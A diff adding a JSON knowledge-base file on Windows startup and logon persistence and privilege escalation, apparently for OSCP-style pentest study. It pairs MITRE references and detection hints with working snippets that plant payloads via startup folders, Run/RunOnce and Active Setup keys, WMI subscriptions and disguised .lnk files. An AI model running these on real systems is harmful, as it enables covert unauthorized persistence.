@@ -1,0 +1,448 @@
+{
+  "phase": {
+    "id": "startup-apps",
+    "title": "Startup Apps",
+    "summary": "Startup folder and Run-key targets that fire on next interactive admin logon.",
+    "icon": "play-circle"
+  },
+  "nodes": [
+    {
+      "id": "start-folder",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Writable global startup folder",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "summary": "Drop a payload in `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp` — runs at any user's logon.",
+      "mitre_attack_id": "T1547.001",
+      "tags": [
+        "startup",
+        "persistence"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Test ACL",
+          "code": "icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\""
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1547.001",
+          "url": "https://attack.mitre.org/techniques/T1547/001/",
+          "kind": "mitre"
+        }
+      ],
+      "description_md": "The All-Users Startup folder (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp`) causes any executable or shortcut placed there to run automatically when **any** user logs in interactively. If a non-admin user can write to this directory, they can plant a payload that executes in the context of the next user (including admins) who logs on.\n\n**Check**: `icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"` — look for `(W)`, `(M)`, or `(F)` for `Everyone`, `BUILTIN\\Users`, or `NT AUTHORITY\\Authenticated Users`.\n\n**Payload types**:\n- Executable (`.exe`, `.bat`, `.ps1`) — most reliable\n- Shortcut (`.lnk`) — stealthier, can use legitimate icon\n- VBScript (`.vbs`) — bypasses some .exe restrictions\n\n**Escalation**: If an administrator is expected to log in after you (e.g., you have a low-priv foothold on an exam box), planting here gives you their token on login.",
+      "detection_hints": "Writes to `C:\\ProgramData\\Microsoft\\...\\Startup` by non-admin accounts; new files with executable extensions in the All-Users startup folder; EID 4688 for processes launched from startup folder paths."
+    },
+    {
+      "id": "start-run-keys",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "Writable Run / RunOnce key target",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "summary": "Run keys point at binaries; if that binary or its directory is writable, swap it.",
+      "related": [
+        "reg-autoruns"
+      ],
+      "tags": [
+        "startup",
+        "registry",
+        "persistence"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Inspect each target's ACL",
+          "code": "for /f \"tokens=2*\" %i in ('reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run') do @icacls \"%j\""
+        }
+      ],
+      "references": [],
+      "description_md": "Run keys in the registry (`HKLM\\...\\Run` and `HKCU\\...\\Run`) execute named binaries at user logon. Rather than modifying the key itself (which usually requires admin for HKLM), the target is the **binary referenced by an existing run key entry**. If that binary is in a writable directory, overwriting it is sufficient.\n\n**Steps**:\n1. Enumerate run key entries: `reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n2. Note each entry's binary path\n3. Check writability: `icacls \"<binary_path>\"` or `accesschk -quvw <binary_path>`\n4. Overwrite with payload (back up the original)\n5. Wait for admin logon or trigger a logoff/logon cycle\n\n**Scope**: HKLM run keys run for all users. HKCU keys run for the specific user whose hive they're in — not directly useful for escalation unless you can write to another user's HKCU.",
+      "detection_hints": "File writes to run-key-referenced binary paths by non-admin accounts; FIM alerts on autostart binary locations; process creation from autorun paths with unexpected content."
+    },
+    {
+      "id": "start-services-auto",
+      "parent_id": null,
+      "kind": "technique",
+      "title": "AutoStart services with weak ACLs",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "summary": "Cross-link to the service-misconfig phase: auto-start services run at boot as their principal.",
+      "related": [
+        "svc-weak-acl",
+        "svc-weak-binary-acl"
+      ],
+      "tags": [
+        "startup",
+        "services"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Auto-start third-party services",
+          "code": "Get-CimInstance Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike 'C:\\Windows\\*' }"
+        }
+      ],
+      "references": [],
+      "description_md": "Auto-start services (Start type = 2 in registry) execute at system boot in the security context of their configured service account (often SYSTEM). This is a cross-reference node to the service misconfigurations phase — the key insight is that **auto-start** services are particularly valuable targets because:\n\n1. They launch without any user interaction (no waiting for logon)\n2. They often run as SYSTEM or a privileged service account\n3. A writable binary/ACL is exploitable at the next reboot\n\n**Prioritization tip**: When both a demand-start and an auto-start service have the same misconfiguration, target the auto-start service first — it will execute on the next system restart or maintenance window without requiring a user to log in.\n\n**Enumeration**: `Get-CimInstance Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike 'C:\\Windows\\*' }` filters for auto-start third-party services.",
+      "detection_hints": "Correlate auto-start service binary modifications (see svc-weak-binary-acl) with unexpected process creation at system startup; EID 7036 (service state change) for unexpected service transitions."
+    },
+    {
+      "id": "start-allusers-folder",
+      "kind": "technique",
+      "title": "All-Users Startup Folder Write Access",
+      "summary": "Place a malicious executable or shortcut in the All-Users Startup folder to execute as every user who logs in, including administrators.",
+      "severity": "high",
+      "parent_id": null,
+      "description_md": "The All-Users Startup folder (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`) executes its contents for every user on login. If this directory grants write access to non-admin users, an attacker can plant a binary or LNK file that runs in the context of each logging-in user.\n\nContrast with per-user startup (`%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`) which only escalates if a higher-privileged user logs in.\n\nCheck: `icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"`",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1547.001",
+      "detection_hints": "File integrity monitoring on All-Users Startup folder. Alert on writes by non-admin accounts. Monitor Event ID 4688 for process creation from startup folder paths.",
+      "tags": [
+        "startup-folder",
+        "all-users",
+        "persistence",
+        "login"
+      ],
+      "related": [
+        "start-run-keys",
+        "start-lnk-hijack"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Check ACL and plant payload",
+          "code": "icacls \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\ncopy C:\\Temp\\payload.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe\"",
+          "description": "Check the All-Users Startup folder ACL, then drop payload for execution on next login.",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "PowerShell ACL check",
+          "code": "$path = [System.Environment]::GetFolderPath('CommonStartup')\n$acl = Get-Acl $path\n$acl.Access | Where-Object {\n    $_.FileSystemRights -match 'Write|FullControl' -and\n    $_.IdentityReference -notmatch 'SYSTEM|Administrators|TrustedInstaller'\n} | Format-Table IdentityReference,FileSystemRights",
+          "description": "Use PowerShell to check if non-admin groups can write to the All-Users Startup folder.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+          "url": "https://attack.mitre.org/techniques/T1547/001/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - Startup Folder",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#startup-folder",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "start-active-setup",
+      "kind": "technique",
+      "title": "Active Setup StubPath Abuse",
+      "summary": "Register a malicious StubPath under HKCU Active Setup key to execute arbitrary commands during user login, leveraging the Active Setup mechanism that runs once-per-user.",
+      "severity": "high",
+      "parent_id": null,
+      "description_md": "Active Setup (`HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\`) runs StubPath commands once per user per component version on login. The mechanism compares version strings between HKLM and HKCU entries and re-runs the StubPath if the HKLM version is newer.\n\nA low-privileged user can write to `HKCU\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\` to override version strings, or an admin can plant HKLM entries. The StubPath runs in the user's context, but if combined with an HKLM write (e.g., via `svc-registry-acl`), can target elevated users.\n\nThis technique is also used for persistence that survives user logoff.",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1547.014",
+      "detection_hints": "Monitor HKLM Active Setup key for new or modified entries. Alert on StubPath values pointing to user-writable directories. Review Event ID 4657 (registry value modified) for Active Setup paths.",
+      "tags": [
+        "active-setup",
+        "stubpath",
+        "registry",
+        "login",
+        "persistence"
+      ],
+      "related": [
+        "start-run-keys",
+        "reg-autoruns"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Enumerate existing Active Setup entries",
+          "code": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" /s | findstr /I \"StubPath\"",
+          "description": "List all existing Active Setup StubPath values to identify the pattern.",
+          "requires_admin": false
+        },
+        {
+          "shell": "cmd",
+          "title": "Plant malicious StubPath in HKLM",
+          "code": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{DEADBEEF-1337-1337-1337-DEADBEEF1337}\" /v StubPath /t REG_SZ /d \"C:\\Temp\\payload.exe\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{DEADBEEF-1337-1337-1337-DEADBEEF1337}\" /v Version /t REG_SZ /d \"1,0,0,0\" /f",
+          "description": "Register a new Active Setup component with a malicious StubPath executed on next user login.",
+          "requires_admin": true
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Boot or Logon Autostart Execution: Active Setup",
+          "url": "https://attack.mitre.org/techniques/T1547/014/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - Active Setup",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#active-setup",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "start-logon-script",
+      "kind": "technique",
+      "title": "UserInitMprLogonScript Registry Logon Script",
+      "summary": "Set the UserInitMprLogonScript registry value under HKCU to execute a script at user logon, or abuse writable HKLM equivalents for system-wide logon script execution.",
+      "severity": "high",
+      "parent_id": null,
+      "description_md": "Windows executes scripts defined in `HKCU\\Environment\\UserInitMprLogonScript` at user logon via the Winlogon process. Any user can set this for their own session, making it a trivial persistence mechanism.\n\nFor privilege escalation: if the attacker can write to another user's `HKCU` hive (e.g., via a backup/restore abuse or profile loading), they can set the script for that higher-privileged user.\n\nAlternatively, `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit` (see `start-winlogon-userinit`) covers SYSTEM-level variants.",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1037.001",
+      "detection_hints": "Monitor `HKCU\\Environment\\UserInitMprLogonScript` for unexpected values. Alert on script execution from this registry trigger by non-standard users. Correlate with Event ID 4624 (logon) and subsequent process creation.",
+      "tags": [
+        "logon-script",
+        "registry",
+        "userinit",
+        "persistence",
+        "hkcu"
+      ],
+      "related": [
+        "start-active-setup",
+        "start-gpo-logon-script"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Set logon script for current user",
+          "code": "reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"C:\\Temp\\payload.bat\" /f",
+          "description": "Register a logon script for the current user that executes on every login.",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "Enumerate logon script values",
+          "code": "# Check current user\nGet-ItemProperty 'HKCU:\\Environment' -Name UserInitMprLogonScript -ErrorAction SilentlyContinue\n# Check loaded user hives\nGet-ChildItem 'HKU:\\' -ErrorAction SilentlyContinue | ForEach-Object {\n    $val = Get-ItemProperty \"HKU:\\$($_.PSChildName)\\Environment\" -Name UserInitMprLogonScript -ErrorAction SilentlyContinue\n    if ($val) { Write-Output \"User $($_.PSChildName): $($val.UserInitMprLogonScript)\" }\n}",
+          "description": "Enumerate UserInitMprLogonScript across all loaded user hives.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Boot or Logon Initialization Scripts: Logon Script (Windows)",
+          "url": "https://attack.mitre.org/techniques/T1037/001/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - Logon Scripts",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#logon-scripts",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "start-gpo-logon-script",
+      "kind": "technique",
+      "title": "GPO Logon Script Abuse",
+      "summary": "Modify or replace a Group Policy logon script referenced in SYSVOL or local policy when the script file or its directory has weak ACLs.",
+      "severity": "high",
+      "parent_id": null,
+      "description_md": "Group Policy can assign logon scripts to users/computers via `User Configuration > Windows Settings > Scripts (Logon/Logoff)`. These scripts are stored in `\\\\<domain>\\SYSVOL\\<domain>\\Policies\\{GPO-GUID}\\User\\Scripts\\Logon\\` or locally in `C:\\Windows\\System32\\GroupPolicy\\User\\Scripts\\Logon\\`.\n\nIf the script file or its containing directory is writable (misconfigured SYSVOL ACLs, or local policy on a workstation), the attacker can replace the script content to execute code when any user in scope logs on.\n\nLocal Group Policy script location: `C:\\Windows\\System32\\GroupPolicy\\User\\Scripts\\Logon\\`",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1037.001",
+      "detection_hints": "Monitor SYSVOL script directories for unauthorized writes. Alert on Group Policy script modifications (gp processing events). Audit GPO script file ACLs during security assessments.",
+      "tags": [
+        "gpo",
+        "logon-script",
+        "sysvol",
+        "group-policy",
+        "domain"
+      ],
+      "related": [
+        "start-logon-script"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Enumerate GPO logon scripts",
+          "code": "dir /s /b \"C:\\Windows\\System32\\GroupPolicy\\User\\Scripts\\Logon\\\"\nnet use Z: \\\\10.10.14.5\\SYSVOL 2>nul\ndir /s /b \"Z:\\<domain>\\Policies\\*\\User\\Scripts\\Logon\\\"",
+          "description": "List all logon scripts configured through local and domain Group Policy.",
+          "requires_admin": false
+        },
+        {
+          "shell": "cmd",
+          "title": "Check ACL on GPO script directory",
+          "code": "icacls \"C:\\Windows\\System32\\GroupPolicy\\User\\Scripts\\Logon\"\nicacls \"\\\\domain.local\\SYSVOL\\domain.local\\Policies\\{GPO-GUID}\\User\\Scripts\\Logon\"",
+          "description": "Verify write permissions on the logon script directories.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Boot or Logon Initialization Scripts: Logon Script (Windows)",
+          "url": "https://attack.mitre.org/techniques/T1037/001/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - GPO Scripts",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#gpo-scripts",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "start-wmi-subscription",
+      "kind": "technique",
+      "title": "WMI Permanent Event Subscription Persistence to Privilege",
+      "summary": "Create a WMI permanent event subscription (EventFilter + EventConsumer + FilterToConsumerBinding) that executes a payload when a trigger condition is met, surviving reboots.",
+      "severity": "critical",
+      "parent_id": null,
+      "description_md": "WMI permanent subscriptions persist in the WMI repository (`%SystemRoot%\\System32\\wbem\\Repository`) and survive reboots. They consist of three objects:\n1. `__EventFilter`: WQL query defining the trigger (e.g., user logon, process creation)\n2. `CommandLineEventConsumer` or `ActiveScriptEventConsumer`: action to execute\n3. `__FilterToConsumerBinding`: links filter to consumer\n\nCommandLineEventConsumer runs as SYSTEM. This provides both persistence and privilege escalation from any user able to create WMI subscriptions (default: administrators only, but misconfigured namespace ACLs may allow others).",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1546.003",
+      "detection_hints": "Monitor WMI subscription creation (Event ID 5857, 5860, 5861 in Microsoft-Windows-WMI-Activity/Operational). Enumerate `__EventFilter`, `__EventConsumer`, `__FilterToConsumerBinding` in `root\\subscription` namespace regularly.",
+      "tags": [
+        "wmi",
+        "persistence",
+        "event-subscription",
+        "system",
+        "reboot-persistent"
+      ],
+      "related": [
+        "start-run-keys"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Create WMI permanent event subscription",
+          "code": "$filterName = 'WindowsUpdateCheck'\n$consumerName = 'WindowsUpdateCheck'\n$payload = 'C:\\Temp\\payload.exe'\n\n# Create event filter (trigger on user logon)\n$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{\n    Name = $filterName\n    EventNamespace = 'root\\cimv2'\n    QueryLanguage = 'WQL'\n    Query = \"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'\"\n}\n\n# Create command-line consumer\n$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{\n    Name = $consumerName\n    ExecutablePath = $payload\n    CommandLineTemplate = $payload\n}\n\n# Bind filter to consumer\nSet-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{\n    Filter = $filter\n    Consumer = $consumer\n}",
+          "description": "Create a WMI permanent subscription that executes a payload on user logon.",
+          "requires_admin": true
+        },
+        {
+          "shell": "powershell",
+          "title": "Enumerate existing WMI subscriptions",
+          "code": "Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Select Name, Query\nGet-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Select Name, ExecutablePath\nGet-WmiObject -Namespace root\\subscription -Class ActiveScriptEventConsumer | Select Name, ScriptText",
+          "description": "List all existing WMI permanent event subscriptions for detection/audit.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Event Triggered Execution: Windows Management Instrumentation Event Subscription",
+          "url": "https://attack.mitre.org/techniques/T1546/003/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - WMI Persistence",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wmi",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "start-runonce",
+      "kind": "technique",
+      "title": "RunOnce / RunOnceEx Registry Persistence",
+      "summary": "Write payloads to RunOnce or RunOnceEx registry keys that execute on next user logon and are deleted after running—useful for one-shot payload delivery or stealthy bootstrapping.",
+      "severity": "high",
+      "parent_id": null,
+      "description_md": "RunOnce keys execute their values once on the next logon and auto-delete:\n- `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce` (current user)\n- `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce` (all users, requires admin write)\n\nRunOnceEx (`RunOnceEx`) supports DLL-based execution and additional flags. Prefixing a value with `!` prevents deletion on failure; `*` forces execution even in safe mode.\n\nDistinct from `start-run-keys` which is persistent; RunOnce is single-shot but evades baseline comparisons that only check Run keys.",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1547.001",
+      "detection_hints": "Monitor RunOnce key writes. Alert on value prefixes `!` or `*`. Correlate RunOnce execution (logon) with subsequent suspicious process chains.",
+      "tags": [
+        "runonce",
+        "registry",
+        "persistence",
+        "logon",
+        "single-shot"
+      ],
+      "related": [
+        "start-run-keys",
+        "reg-autoruns"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Write to HKCU RunOnce",
+          "code": "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v WindowsUpdate /t REG_SZ /d \"C:\\Temp\\payload.exe\" /f",
+          "description": "Register a single-execution payload in the current user's RunOnce key.",
+          "requires_admin": false
+        },
+        {
+          "shell": "cmd",
+          "title": "Write to HKLM RunOnceEx (all users, requires elevated write)",
+          "code": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\" /v Payload /t REG_SZ /d \"C:\\Temp\\payload.dll\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\" /ve /t REG_SZ /d \"Windows Update Component\" /f",
+          "description": "Use RunOnceEx to execute a DLL on next logon for all users.",
+          "requires_admin": true
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+          "url": "https://attack.mitre.org/techniques/T1547/001/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - Registry Run Keys",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#registry-run-keys",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "start-lnk-hijack",
+      "kind": "technique",
+      "title": "Shortcut (.lnk) Hijack in Startup Folder",
+      "summary": "Replace or modify a .lnk shortcut in a Startup folder to redirect execution to an attacker-controlled binary while maintaining the appearance of a legitimate autostart entry.",
+      "severity": "high",
+      "parent_id": null,
+      "description_md": "Startup folders commonly contain .lnk shortcut files that point to legitimate programs. If the Startup folder or the .lnk file itself is writable, an attacker can:\n1. Replace the .lnk file with one pointing to a malicious binary\n2. Modify the `TargetPath` within an existing .lnk\n3. Create a new .lnk that executes a payload then launches the legitimate target (stager pattern)\n\nLNK files can also use relative paths and environment variables, enabling subtle path manipulation. Use `$shell = New-Object -ComObject WScript.Shell` to create/modify LNK files in PowerShell.",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1547.001",
+      "detection_hints": "Monitor .lnk file writes in Startup folders. Alert on LNK target path changes. Binary analysis of .lnk files at startup: compare target hash against known-good baseline.",
+      "tags": [
+        "lnk",
+        "shortcut",
+        "startup-folder",
+        "hijack",
+        "persistence"
+      ],
+      "related": [
+        "start-allusers-folder",
+        "start-run-keys"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Create malicious .lnk in startup folder",
+          "code": "$startupPath = [System.Environment]::GetFolderPath('CommonStartup')\n$shell = New-Object -ComObject WScript.Shell\n$shortcut = $shell.CreateShortcut(\"$startupPath\\WindowsDefenderUpdate.lnk\")\n$shortcut.TargetPath = 'C:\\Temp\\payload.exe'\n$shortcut.WorkingDirectory = 'C:\\Temp'\n$shortcut.IconLocation = 'C:\\Windows\\System32\\shield.ico'\n$shortcut.Save()",
+          "description": "Create a .lnk in the All-Users Startup folder pointing to the attacker payload, using a legitimate-looking icon.",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "Enumerate and audit existing startup shortcuts",
+          "code": "$paths = @(\n    [System.Environment]::GetFolderPath('CommonStartup'),\n    [System.Environment]::GetFolderPath('Startup')\n)\n$shell = New-Object -ComObject WScript.Shell\n$paths | ForEach-Object {\n    Get-ChildItem $_ -Filter '*.lnk' -ErrorAction SilentlyContinue | ForEach-Object {\n        $lnk = $shell.CreateShortcut($_.FullName)\n        Write-Output \"$($_.Name) -> $($lnk.TargetPath)\"\n    }\n}",
+          "description": "List all .lnk files in Startup folders and their targets for audit.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+          "url": "https://attack.mitre.org/techniques/T1547/001/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - Startup Folder Shortcuts",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#startup-folder",
+          "kind": "hacktricks"
+        }
+      ]
+    }
+  ]
+}
